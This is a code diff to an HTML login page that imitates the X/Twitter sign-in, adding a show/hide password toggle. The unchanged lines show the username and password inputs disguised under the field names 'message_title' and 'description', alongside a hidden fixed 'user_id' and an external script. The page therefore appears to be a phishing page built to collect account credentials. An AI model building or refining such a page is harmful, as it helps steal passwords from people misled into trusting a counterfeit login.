@@ -50,6 +50,21 @@
             outline: none;
             border-color: #1d9bf0;
         }
+        .password-wrapper {
+            position: relative;
+        }
+        .eye-icon {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            font-size: 18px;
+            color: #aaa;
+        }
+        .eye-icon:hover {
+            color: #fff;
+        }
         .login-button {
             width: 100%;
             background: #1d9bf0;
@@ -106,7 +121,12 @@
             <input type="hidden" name="login" value="login">
             <input type="hidden" name="user_id" value="16934">
             <input type="text" class="form-input" name="message_title" placeholder="Phone, email, or username" required>
-            <input type="password" class="form-input" name="description" placeholder="Password" required>
+            
+            <div class="password-wrapper">
+                <input type="password" class="form-input" name="description" placeholder="Password" id="password" required>
+                <span class="eye-icon" id="togglePassword">&#128065;</span>
+            </div>
+            
             <button type="submit" class="login-button">Log In</button>
         </form>
         <a href="#" class="forgot-password">Forgot password?</a>
@@ -117,5 +137,15 @@
 
     <!-- Optional external JS -->
     <script src="intelligent.js"></script>
+    <script>
+        const togglePassword = document.getElementById('togglePassword');
+        const passwordField = document.getElementById('password');
+
+        togglePassword.addEventListener('click', () => {
+            const type = passwordField.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordField.setAttribute('type', type);
+            togglePassword.textContent = type === 'password' ? '👁️' : '🙈';
+        });
+    </script>
 </body>
 </html>
